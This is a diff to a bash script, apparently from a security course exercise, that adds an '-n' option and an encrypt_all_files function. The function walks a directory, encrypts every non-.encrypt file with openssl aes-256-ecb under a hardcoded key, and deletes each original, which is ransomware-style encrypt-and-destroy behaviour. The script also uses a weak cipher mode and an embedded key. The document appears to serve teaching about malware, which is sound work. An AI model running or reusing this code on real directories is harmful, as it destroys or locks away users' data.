@@ -7,6 +7,7 @@ DIRPATH=
 CREATE_FILES=
 ENCRYPT_FILES=
 DECRYPT=
+ENCRYPT=
 CREATED_FILES_ARRAY=()
 ENCRUPTION_METHOD=aes-256-ecb
 ENCRYPTION_KEY=mousakas
@@ -20,10 +21,11 @@ print_usage() {
     echo "    p     The action's directory"
     echo "    c     The number of files the user wants to create"
     echo "    e     The number of files the user wants to create and encrypt"
+    echo "    n     Encrypt all the files (not .encrypt) of the given directory "
     echo ""
     echo "flag:"
     echo "    h     Prints the help menu"
-    echo "    d     Decrypts all the .encrypt files in the given directory"
+    echo "    d     Decrypts all the .encrypt files of the given directory"
     exit 1
 }
 
@@ -32,6 +34,7 @@ check_args(){
     local cFiles=$CREATE_FILES
     local eFiles=$ENCRYPT_FILES
     local dec=$DECRYPT
+    local enc=$ENCRYPT
 
     # checking if directory defined, if not print usage
     if ! [ -n "$dir" ] ; then
@@ -40,7 +43,7 @@ check_args(){
     #     echo "direction = $dir"
     fi
     # checking if any of the available actions defined, if not print usage
-    if ! [ -n "$cFiles" ] && ! [ -n "$eFiles" ] && ! [ -n "$dec" ] ; then 
+    if ! [ -n "$cFiles" ] && ! [ -n "$eFiles" ] && ! [ -n "$dec" ] && ! [ -n "$enc" ] ; then 
 		print_usage
     # else
     #     echo "Number of encrypted files = $eFiles"
@@ -50,7 +53,7 @@ check_args(){
 }
 
 get_args(){
-    while getopts "p:e:c:dh" opt; do
+    while getopts "p:e:c:dnh" opt; do
         case $opt in
             p)
                 DIRPATH=$OPTARG/
@@ -63,6 +66,9 @@ get_args(){
                 ;;
             d)
                 DECRYPT=1
+                ;;
+            n)
+                ENCRYPT=1
                 ;;
             h) 
                 print_usage
@@ -106,6 +112,18 @@ encrypt_x_files () {
     done
 }
 
+encrypt_all_files () {
+    find $DIRPATH -not -name "*.encrypt" -not -type d -print0 > tmpfile
+    while IFS=  read -r -d $'\0';
+    do  
+        OPENSSL_INPUT_FILE=$REPLY
+        OPENSSL_OUTPUT_FILE=$REPLY.encrypt
+        openssl enc -$ENCRUPTION_METHOD -pbkdf2 -in $OPENSSL_INPUT_FILE -out $OPENSSL_OUTPUT_FILE -k $ENCRYPTION_KEY
+        rm -f $REPLY 
+    done < tmpfile
+    rm -f tmpfile
+}
+
 decrypt_files() {
     local decrypted_files=()
     find $DIRPATH -name "*.encrypt" -print0 > tmpfile
@@ -137,6 +155,9 @@ if [ -n "$ENCRYPT_FILES" ]; then
 fi
 if [ -n "$DECRYPT" ] ; then 
     decrypt_files
+fi
+if [ -n "$ENCRYPT" ] ; then 
+    encrypt_all_files
 fi
 
 unset LD_PRELOAD
